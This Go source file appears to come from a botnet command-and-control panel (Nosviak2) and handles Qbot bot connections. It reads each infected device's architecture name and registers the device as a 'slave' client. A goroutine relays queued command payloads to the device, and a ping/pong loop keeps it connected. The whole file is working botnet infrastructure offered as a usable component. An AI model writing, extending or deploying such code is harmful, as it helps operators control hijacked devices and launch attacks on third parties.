package qbot

import (
	"net"
	"strings"
	"time"

	//"Nosviak2/core/sources/layouts/toml"
	
	"Nosviak2/core/sources/tools"
	"Nosviak2/core/sources/layouts/toml"
)

//handles the new connection properly
//this will ensure its done without issues
func HandleConnection(connection net.Conn) error { //err handles

	name := make([]byte, 144)
	//reads slave name properly
	//this will ensure its done without errors
	if _, err := connection.Read(name); err != nil {
		return err //error returned
	}

	//sanatizes the architecture properly and safely
	//allows for proper control without issues happening
	architecture := strings.ReplaceAll(tools.Sanatize(string(name)), toml.ConfigurationToml.Qbot.Splitter, "")

	
	d := QbotClient{Name: architecture, Queue: make(chan []byte), Conn: connection}
	

	//adds the client into the map properly
	//this will ensure its done without errors
	d.AddClient()

	go func() { //goroutines properly and safely
		for { //for loops properly and safely without issues
			Magenet := <-d.Queue

			//build the payload properly
			//this will now be broadcasted safely
			if _, err := connection.Write([]byte(string(Magenet))); err != nil {
				break //ends connection watcher properly
			}
		}
	}()

	//removes when information done
	//allows us to remove the client properly
	defer d.RemoveClient()

	for { //sleeps for ping timeout properly
		time.Sleep(time.Duration(toml.ConfigurationToml.Qbot.PingDelay) * time.Second)
		if _, err := connection.Write([]byte(toml.ConfigurationToml.Qbot.PingString + "\n")); err != nil {
			return err //err returns properly and safely
		}
		//allows 1 second for the reader to pick on req
		//ensure we dont hold for invalid connections properly
		connection.SetReadDeadline(time.Now().Add(1 * time.Second))

		SyncPong := make([]byte, 144) //reads properly
		if _, err := connection.Read(SyncPong); err != nil {
			return err //error returns properly
		}

		//contains the subject properly and safely
		if strings.Contains(string(SyncPong), toml.ConfigurationToml.Qbot.PingValid) {
			continue
		}

		//breaks from invalid slave
		//this will ensure its done properly
		break
	}
	return nil
}